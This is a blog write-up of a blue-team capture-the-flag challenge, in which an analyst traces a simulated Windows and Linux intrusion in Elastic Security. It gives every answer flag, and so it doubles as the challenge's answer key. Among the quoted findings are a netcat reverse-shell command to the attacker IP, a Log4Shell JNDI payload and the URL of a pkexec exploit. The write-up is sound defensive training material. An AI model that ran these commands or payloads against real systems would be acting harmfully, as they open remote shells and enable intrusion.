---
title: "Blue Team CTF Challenge - Elastic Case (Write Up)"
date: 2023-2-1T09:34:30-04:00
categories:
  - CTF
tags:
  - CTF
  - Incident Response
  - Kibana
  - SIEM
  - Elastic
  - Windows
comments: true

---

![29-completion.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/29-completion.jpg)

## Blue Team CTF Challenge - Elastic Case

Through this challenge, I learnt to understand how Elastic Security can be used for threat hunting. There were a few different scenarios in this challenge which gave me the opportunity to explore the different features within the Security module. 

Personally, I find the analyzer to be useful when tracing Windows Processes because it gives a bird's-eye view of the processes, the time between each process executed and all the registry/files/network involved.

You can access the challenge [here][challenge-url].

## Scenario

An attacker was able to trick an employee into downloading a suspicious file and running it. The attacker compromised the system, along with that, The Security Team did not update most systems. 

The attacker was able to pivot to another system and compromise the company. 

As a SOC analyst, you are assigned to investigate the incident using Elastic as a SIEM tool and help the team to kick out the attacker.

---
## Accessing Elastic Security

![1-kibana-security-module.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/1-kibana-security-module.jpg)

---
### 1. Who downloads the malicious file which has a double extension?
* Flag: ```ahmed```
* Points: 50
* Search Term: ```file.name : *.*.*```

![2-double-extension-result.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/2-double-extension-result.jpg)

The search results revealed that there is only one file with double extension. From this output, we can derive answers for question 1 to 3.

### 2. What is the hostname he was using?
* Flag: ```DESKTOP-Q1SL9P2```
* Points: 50

### 3. What is the name of the malicious file?
* Flag: ```Acount_details.pdf.exe```
* Points: 50

### 4. What is the attacker's IP address?
* Flag: ```192.168.1.10```
* Points: 100

Using Kibana, we are able to analyze events to find out more information.
![3-analyze-events.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/3-analyze-events.jpg)

The details of the running processes can be expanded further to retrieve more information.
![4-11-networks.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/4-11-networks.jpg)

Upon expanding the value ```ZGRkOTM3YWEtOTQ0YS00ZmFiLWIzNjItZTM0NjJhODM0MWNjLTEzNTk2LTEzMjg4Mjg5NzIxLjI2MDY5NzkwMA==```, we were able to identify the attacker's IP address.
![5-malicious-ip-address.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/5-malicious-ip-address.jpg)

### 5. Another user with high privilege runs the same malicious file. What is the username?
* Flag: ```cybery```
* Points: 50
* Search Query: ```file.name:Account_details.pdf.exe```
![6-higher-privilege-user.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/6-higher-privilege-user.jpg)

This was the only other user that ran the same malicious file.

### 6. The attacker was able to upload a DLL file of size 8704. What is the file name?
* Flag: ```mCblHDgWP.dll```
* Points: 100
* Search Query: ```file.size:8704```
![7-dll.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/7-dll.jpg)
Using the search query, we were also able to identity the file name easily.

### 7. What parent process name spawns cmd with NT AUTHORITY privilege and pid 10716?
* Flag: ```rundll32.exe```
* Points: 100
* Search Query: ```process.pid:10716```
![8-parent-process.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/8-parent-process.jpg)
In addition to the search query, we had to expand to see the details. The name of the process parent is shown here.

### 8. The previous process was able to access a registry. What is the full path of the registry?
* Flag: ```HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled```
* Points: 100
![9-registry-path.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/9-registry-path.jpg)
Expanding registry allows us to see the full path.

### 9. PowerShell process with pid 8836 changed a file in the system. What was that filename?
* Flag: ```ModuleAnalysisCache```
* Points: 100
![10-file-change.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/10-file-change.jpg)
Moving the cursor towards southeast, we see that there is a powershell.exe running process. Expanding this shows us the file name.

### 10. PowerShell process with pid 11676 created files with the ps1 extension. What is the first file that has been created?
* Flag: ```__PSScriptPolicyTest_bymwxuft.3b5.ps1```
* Points: 50
* Search Query: ```process.pid:11676 and file.extension:ps1```
![11-power-shell-process.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/11-power-shell-process.jpg)
We know that PowerShell script extension will be .ps1. We added this into the search query and was able to find powershell.exe and the first file that was created. 

### 11. What is the machine's IP address that is in the same LAN as a windows machine?
* Flag: ```192.168.10.30```
* Points: 50


![13-end-points.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/13-end-points.jpg)

Upon selecting "Endpoints", we are able to see a list of end points and IP addresses.

![12-ip-address.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/12-ip-address.jpg)

There are only 3 host machines. We know that the Windows machine has the IP address 192.168.10.10. The other IP address in the same subnet is 192.168.10.30 which is the Ubuntu machine.

### 12. The attacker login to the Ubuntu machine after a brute force attack. What is the username he was successfully login with?
* Flag: ```salem```
* Points: 100

![14-hosts.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/14-hosts.jpg)\
![15-user-authentication.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/15-user-authentication.jpg)\
![16-successful-login.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/16-successful-login.jpg)

I'm not sure if there is a more effective way to get this flag. What I did was glance through all the host, pick the one with the highest failed user authentication. I saw that Salem has the closest time between last failure and last success.

### 13. After that attacker downloaded the exploit from the GitHub repo using wget. What is the full URL of the repo?
* Flag: ```https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py```
* Points: 150
* Search Query: ```wget```

![17-search-term.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/17-search-term.jpg)

Using the search term ```wget```, we were able to identify the full URL of the Github repo.

![18-github-url.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/18-github-url.jpg)

### 14. After the attacker runs the exploit, which spawns a new process called pkexec, what is the process's md5 hash?
* Flag: ```3a4ad518e9e404a6bad3d39dfebaf2f6```
* Points: 150
![19-pkexec.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/19-pkexec.jpg)

![20-md5-hash.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/20-md5-hash.jpg)

### 15. Then attacker gets an interactive shell by running a specific command on the process id 3011 with the root user. What is the command?
* Flag: ```bash -i```
* Points: 150
![21-bash-i.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/21-bash-i.jpg)

### 16. What is the hostname which alert signal.rule.name: "Netcat Network Activity"?
* Flag: ```centOS``
* Points: 100
![22-netcat-activity.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/22-netcat-activity.jpg)
![23-hostname-username.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/23-hostname-username.jpg)

### 17. What is the username who ran netcat?
* Flag: ```solr```
* Points: 100

### 18. What is the parent process name of netcat?
* Flag: ```java```
* Points: 100
* Search Query: ```nc```
![24-java.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/24-java.jpg)

### 19. If you focus on nc process, you can get the entire command that the attacker ran to get a reverse shell. Write the full command?
* Flag: ```nc -e /bin/bash 192.168.1.10 9999```
* Points: 150
![25-nc-command.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/25-nc-command.jpg)

### 20. From the previous three questions, you may remember a famous java vulnerability. What is it?
* Flag: ```log4shell```
* Points: 200
* Search Query: ```java netcat vulnerability``` on Google
![26-log-4-shell.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/26-log-4-shell.jpg)

### 21. What is the entire log file path of the "solr" application?
* Flag: ```/var/solr/logs/solr.log```
* Points: 200
* Search Query: ```log.file.path:*solr*```
![27-solr-log.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/27-solr-log.jpg)

### 22. What is the path that is vulnerable to log4j?
* Flag: ```/admin/cores```
* Points: 200
![28-log4j-vulnerable-path.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2023-2-2-elastic-case/28-log4j-vulnerable-path.jpg)

### 23. What is the GET request parameter used to deliver log4j payload?
* Flag: ```foo```
* Points: 200

### 24. What is the JNDI payload that is connected to the LDAP port?
* Flag: ```{foo=${jndi:ldap://192.168.1.10:1389/Exploit}}```
* Points: 250



[challenge-url]: https://cyberdefenders.org/blueteam-ctf-challenges/90